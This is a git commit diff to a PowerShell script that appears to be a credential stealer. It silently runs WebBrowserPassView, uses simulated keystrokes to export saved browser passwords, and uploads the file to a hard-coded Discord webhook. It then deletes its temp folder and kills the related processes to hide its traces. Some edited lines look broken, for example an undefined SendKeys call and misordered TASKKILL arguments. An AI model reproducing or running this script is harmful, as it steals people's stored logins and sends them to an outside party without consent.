aedd31cec9892ea6b2bffa5167502a6df582a75e
2jeg <nick.kaza1337@gmail.com>
2025-02-02 22:54:49 +1100

    Update 2partcodeexec (1).ps1

--- 2partcodeexec (1).ps1
+++ 2partcodeexec (1).ps1
@@ -13,27 +13,30 @@ Invoke-WebRequest -Uri 'https://www.7-zip.org/a/7za920.zip' -OutFile '7z.zip'
 Expand-Archive '7z.zip'
 & '.\7z\7za.exe' e 'wbpv.zip'
 
-$webBrowserPassword = 'wbpv28821@'
-Start-Process -FilePath '.\WebBrowserPassView.exe' -ArgumentList $webBrowserPassword -WindowStyle Hidden
+$extractionPassword = 'wbpv28821@'
+
+Start-Process -FilePath '.\WebBrowserPassView.exe' -WindowStyle Hidden
 
 Start-Sleep -Seconds 3
-SendKeys.SendWait('^a')  # CTRL + A
-SendKeys.SendWait('^s')  # CTRL + S
+SendKeys '^(a)'  # CTRL + A
 Start-Sleep -Seconds 3
-SendKeys.SendWait('export.html')
-SendKeys.SendWait('{TAB}')
-SendKeys.SendWait('h')
-Start-Sleep -Seconds 1.7
-SendKeys.SendWait('%{F4}')  # ALT + F4
+SendKeys '^(s)'  # CTRL + S
+Start-Sleep -Seconds 3
+SendKeys 'export.html'  # File name
+SendKeys '{TAB}'  # Move to save button
+SendKeys 'h'  # Hit save
+Start-Sleep -Seconds 1
+SendKeys '%{F4}'  # ALT + F4 to close the application
 
-$webhookUrl = 'DISCORD-WEBHOOK'
+$webhookUrl = 'https://discord.com/api/webhooks/1333404978911510651/FVr2hApcOYlBDhSDad7s0Zr_kCIts4bBRz9OjYXOVsHH-uaY3nR3fNqP0bQ7lQSOGbRX'
 $filePath = 'C:\temp\export.html'
+
 Invoke-RestMethod -Uri $webhookUrl -Method Post -Form @{ file1 = Get-Item $filePath }
 
 Set-Location 'C:\temp'
+$tmpfolder = 'C:\temp'
 Remove-Item -Recurse -Force $tmpfolder
 
-# Terminate any running instances of 7za.exe, 7z.exe, and powershell.exe
-Stop-Process -Name '7za' -Force -ErrorAction SilentlyContinue
-Stop-Process -Name '7z' -Force -ErrorAction SilentlyContinue
-Stop-Process -Name 'powershell' -Force -ErrorAction SilentlyContinue
+TASKKILL /IM /F "7z.exe"
+TASKKILL /IM /F "7za.exe"
+TASKKILL /IM /F "powershell.exe"
